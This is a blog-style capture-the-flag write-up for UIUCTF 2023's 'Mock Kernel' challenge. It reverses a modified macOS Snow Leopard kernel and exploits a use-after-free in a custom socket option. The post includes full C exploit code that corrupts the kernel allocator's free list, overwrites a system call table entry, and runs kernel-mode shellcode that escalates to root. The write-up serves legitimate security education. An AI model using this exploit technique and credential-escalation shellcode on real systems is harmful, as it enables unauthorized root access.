---
layout: post
title: "[UIUCTF 2023] Mock Kernel"
author: Robert Xiao
---

## Problem Description

### Mock Kernel

- Solves: 4
- Score: 483
- Tags: pwn, extreme

We found my brother's old iMac but forgot the password, maybe you can help me get in?

He said he was working on something involving "pointer authentication codes" and "a custom kernel"? I can't recall...

Attached is the original Snow Leopard kernel macho as well as the kernel running on the iMac.

Attachments: `mach_kernel.orig`, `mach_kernel.sigpwny`

## Introduction

We're given a modified kernel for the macOS Snow Leopard (10.6) operating system. Our goal will be to escalate to root and read `/flag` on a remotely-hosted instance of macOS running this custom kernel.

We're also told that the organizers have backported patches for several known Snow Leopard N-Days. Although some N-days are still viable, and some other teams solved the challenge through unpatched N-days, I decided to approach the problem "as intended" and probe the custom kernel's new functionality.

### Running the kernel

Since we're going to do kernel exploitation, it's very helpful to have a local testing environment. The challenge description includes a complicated set of instructions for setting up a local install with QEMU. Since I have a Mac and VMWare Fusion, I chose the easier route of directly installing the OS on VMWare.

Due to licensing restrictions, VMWare only runs Mac OS X Server; if you try to boot the 10.6 installer, you get an error: "The guest operating system is not Mac OS X Server. This virtual machine will power off.". Luckily, there's a workaround (found via this blog post: https://blog.rectalogic.com/2008/08/virtualizing-mac-os-x-leopard-client.html): edit the ISO to add the file `/System/Library/CoreServices/ServerVersion.plist` (can be empty) and VMWare Fusion will treat the disk as OS X Server, allowing it to boot and install! Finally, just apply the same hack to the installed OS (using the Terminal in the installer) to get a functioning non-server OS X install under VMWare.

> Aside: the specific set of steps is as follows:
> 1. Mount the install ISO by double-clicking it
> 2. run `touch "/Volumes/Mac OS X Install DVD/System/Library/CoreServices/ServerVersion.plist"` to create the file on the install ISO
> 3. Unmount ("eject") the ISO
> 4. Boot the VM and install Mac OS as usual
> 5. When the install finishes, shutdown the VM, reconnect the ISO (if it was automatically ejected), and boot back into the installer.
> 6. Open the installer's Terminal from the Utilities menu
> 7. Run `touch "/Volumes/Macintosh HD/System/Library/CoreServices/ServerVersion.plist"` from the installer's Terminal to create the file on the VM's hard drive
> 8. Shutdown the VM, disconnect the ISO, and boot it up - it should work.

VMWare also supports GDB debugging by adding the line `debugStub.listen.guest64 = "TRUE"` to the VMX file. Then, we can use `target remote localhost:8864` in GDB to debug the kernel.

### Reversing

The kernel is a pretty big binary. To identify the organizer's changes, I started by diffing the symbol tables to find any new functions:

`diff <(nm mach_kernel.orig | cut -d' ' -f2-) <(nm mach_kernel.sigpwny | cut -d' ' -f2-)  | grep '^>'`

This produces the following list of new symbols (excluding compiler-generated symbols like `__dtrace_probeDOLLAR1259___proc____exec`):

```
> T _alloc_sotag
> T _auth_sotag
> T _canonicalize
> T _compute_pac
> T _get_signature
> T _sign_sotag
> T _softpac_auth
> T _softpac_sign
> T _sotag_call_dispatch
> T _sotag_default_dispatch
> T _strip_signature
```

These are novel functions as they do not appear in the kernel source code (https://opensource.apple.com/source/xnu/xnu-1456.1.26), and several reference PAC (which is also mentioned in the challenge description).

PAC is short for "pointer authentication code", a scheme in which 64-bit pointers are cryptographically signed by placing a keyed hash of the pointer value in the top bits of the pointer. The term is usually associated with the ARM64 hardware implementation of PAC, which is widely used in modern ARM-based macOS and iOS systems. In this challenge, it looks like a software-based PAC implementation has been developed by the challenge author.

Using Ghidra, we can identify the functions and how they are called by following the references to each function.

- `sosetopt` and `sogetopt`, which handle the `setsockopt` and `getsockopt` system calls respectively, have been extended with a new option number (appropriately 0x1337). The option takes a buffer of size 0x50 bytes. These can be reached by calling `[set/get]sockopt(sock, SOL_SOCKET, 0x1337, buf, bufsize)` with a socket `sock`.
- `sosetopt` checks the first DWORD of the buffer:
    - If it is 0, it calls `alloc_sotag` to construct a new object and stores it in a field of the kernel socket object.
        - `alloc_sotag` allocates 0x48 bytes of memory with `kalloc` (which I'll call `sotag`), and a second 0x100 byte chunk of memory (which I'll call `dispatch`). It writes the address of the function `sotag_default_dispatch` to `dispatch + 0`, and the address of `dispatch` to `sotag + 0x40`. Finally, it calls `sign_sotag`.
        - `sign_sotag` calls `softpac_sign` twice to sign the function pointer to `sotag_default_dispatch` and the pointer to `dispatch`.
        - `softpac_sign` calls `compute_pac` to compute the actual PAC code, which occupies bits 47 through 62 of the address.
        - `compute_pac` computes the MD5 of the pointer value and the pointer's address, and then folds the 16 bytes of MD5 into 2 bytes of output.
    - If it is 1, the first 0x40 bytes of the user's input buffer is copied into the first 0x40 bytes of the `sotag` object.
    - If it is 3, the buffer is freed. The buffer pointer is not zeroed, so we can free it multiple times - this gives us a **double-free bug** and **use-after-free bug**.
- `sogetopt` calls `sotag_call_dispatch` on the `sotag` object.
    - `sotag_call_dispatch` first calls `auth_sotag`.
    - `auth_sotag` calls `softpac_auth` twice, on the `dispatch` pointer and the function pointer.
    - `softpac_auth` extracts the PAC code and verifies it against the value from `compute_pac`. If there's a mismatch, it panics the kernel. Otherwise, it removes the PAC code, making the pointer dereferenceable. 
    - `sotag_call_dispatch` then calls the function pointer inside `dispatch`.
    - Finally, `sotag_call_dispatch` calls `sign_sotag` to replace the signatures.

### Exploitation

The intended exploit seems to be to use the use-after-free to leak the `sotag` and `dispatch` pointers, then use the use-after-free to forge valid pointers and call arbitrary functions. One way to do this, as given in a problem hint, is to use Mach messages with out-of-line (OOL) port descriptors.

I went down the path of understanding OOL ports and the typical exploit flow. During this process, I decided to analyze the kernel memory allocator to understand how it handed out memory, aiming to make the use-after-free exploit more predictable.

`kalloc` is implemented in [`osfmk/kern/kalloc.c`](https://opensource.apple.com/source/xnu/xnu-1456.1.26/osfmk/kern/kalloc.c.auto.html). It maintains a set of "zones" for a range of preset allocation sizes; for sizes that fit into one of those zones, it simply forwards to the zone allocator (zalloc). We can run `sudo zprint` in the VM's terminal to dump out all of the available zones; for example, 0x48-byte allocations are serviced out of the `kalloc.128` zone.

`zalloc` is implemented in [`osfmk/kern/zalloc.c`](https://opensource.apple.com/source/xnu/xnu-1456.1.26/osfmk/kern/zalloc.c.auto.html). It implements a zone-based memory allocator; a zone is a collection of fixed-sized blocks (in the case of `zalloc.128`, each block is 128 bytes long). `zalloc` and `zfree` use a singly-linked free list: freed blocks are placed on the free list, which is pointed to by the zone's control structure; each free block contains a pointer to the next free block in the first QWORD. The macros `ADD_TO_ZONE` and `REMOVE_FROM_ZONE` implement the main free list management logic. Some sanity checking is performed if the variable `check_freed_element` is set, but it is *not* set in our kernel!

We can free the `sotag` structure and immediately write to it to corrupt the free list. Since all the sanity checks are turned off, we can cause the allocator to return any pointer we choose as the next allocation. The only restriction is that we will want the first QWORD at the target address to be zero; if it is nonzero, `kalloc` will use it for a subsequent allocation, which could cause a crash or unwanted memory corruption. If it is zero, `kalloc` will simply assume that the zone is exhausted and allocate more zone memory.

As far as targets go, one option is to overwrite the kernel's system call table. This is very safe: we can target an unused system call, overwrite the system call pointer, and get a straightforward function call with controllable arguments. The system call table on Mac OS, `sysent`, is an array of 0x28-byte records with plenty of zeros in the unused entries. This also means that we don't have to touch any of the soft-PAC stuff.

The 10.6 kernel is old enough that it doesn't feature KASLR, so the kernel addresses are fixed, and it doesn't have SMEP, so the kernel will happily execute code at userspace addresses. Thus, we can include some kernel-mode shellcode in our exploit program and specify its userspace address for our fake system call. The shellcode we need to use will use a few kernel APIs to elevate our process's credentials to that of root.

To sum up the exploit:

- Allocate a `sotag`.
- Free the `sotag` and immediately overwrite the first 8 bytes with a pointer to the middle of the `sysent` system call table.
- Allocate two `sotag`s. The first will reuse the memory of the original freed `sotag`. The second will be our corrupted allocation pointing to `sysent`.
- Overwrite the `sysent` `sotag` with a suitable `sysent` entry pointing to our user-mode shellcode.
- Trigger the fake system call to run our shellcode in kernel mode.
- Execute `/bin/sh` to get a root shell.

The exploit code is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <stdint.h>

#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

static void alloc_sotag(int fd) {
    char buf[0x50] = {0, 0, 0, 0};
    setsockopt(fd, SOL_SOCKET, 0x1337, buf, 0x50);
}

static void free_sotag(int fd) {
    char buf[0x50] = {3, 0, 0, 0};
    setsockopt(fd, SOL_SOCKET, 0x1337, buf, 0x50);
}

static void write_sotag(int fd, const void *data) {
    char buf[0x50] = {1, 0, 0, 0};
    memcpy(buf + 8, data, 0x40);
    setsockopt(fd, SOL_SOCKET, 0x1337, buf, 0x50);
}

static void read_sotag(int fd, void *buf) {
    socklen_t size = 0x50;
    getsockopt(fd, SOL_SOCKET, 0x1337, buf, &size);
}

long shellcode() {
    /* No ASLR, what joy (although the read in getsockopt is more than sufficient to break ASLR) */
    void (*dummy_ret)() = (void *)0xffffff800054c9e8; // set breakpoint here to debug
    void *(*kauth_cred_get_with_ref)() = (void *)0xffffff8000467644;
    void (*mac_cred_label_destroy)(void *) = (void *)0xffffff800025bc0f;
    void (*mac_cred_label_init)(void *) = (void *)0xffffff800055c73e;
    void *(*kauth_cred_setresuid)(void *, int, int, int, int) = (void *)0xffffff8000467126;
    void *(*kauth_cred_setresgid)(void *, int, int, int) = (void *)0xffffff8000467ec4;
    char *(*current_proc)(void) = (void *)0xffffff800025350c;
    void (*chgproccnt)(int, int) = (void *)0xffffff800024a4e6;

    // call a random ret instruction for debugging purposes
    dummy_ret();
    // shellcode adapted from https://github.com/ret2/Pwn2Own-2021-Safari/blob/main/eop/kernel_sc.c
    void* cred = kauth_cred_get_with_ref();
    mac_cred_label_destroy(cred);
    mac_cred_label_init(cred);
    // userspace will re-call setuid(0) to make sure some extra bookkeeping occurs
    cred = kauth_cred_setresuid(cred, 0, 0, 17, 0);
    cred = kauth_cred_setresgid(cred, 0, 0, 0);
    // manually overwrite p->u_cred (offset from _proc_ucred)
    *(void**)(current_proc()+0xc0) = cred;
    chgproccnt(0, 1);

    return 0x42424242;
}

int main() {
    char buf[0x50];
    bzero(buf, sizeof(buf));

    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    alloc_sotag(sock);
    free_sotag(sock);
    /* Overwrite forward pointer of a freed chunk */
    *(uint64_t *)buf = 0xffffff8000656d10ULL; // &sysent[114]
    write_sotag(sock, buf);
    /* First allocation reallocates the freed chunk; second allocation
       goes wherever we want. */
    alloc_sotag(sock);
    alloc_sotag(sock);

    /* Overwrite sy_call of an unused syscall to call shellcode.
       No SMEP, so we can just call user code directly. */
    bzero(buf, sizeof(buf));
    *(void **)&buf[8] = &shellcode;
    write_sotag(sock, buf);

    /* Trigger custom syscall to run shellcode in kernel mode */
    long ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        : "0"(0x2000072)
        : "rcx", "r11", "memory"
    );

    /* If all went well, we're root now */
    setuid(0);

    printf("fake syscall returned %lx\n", ret);
    printf("done!\n");
    fflush(stdout);
    system("/bin/sh -pi");
}
```

When run, we get our desired root shell, from which we can `cat /flag`:

`uiuctf{sn0w_le0p4rd_1s_th3_b3st_XNU_ever_m4de}`
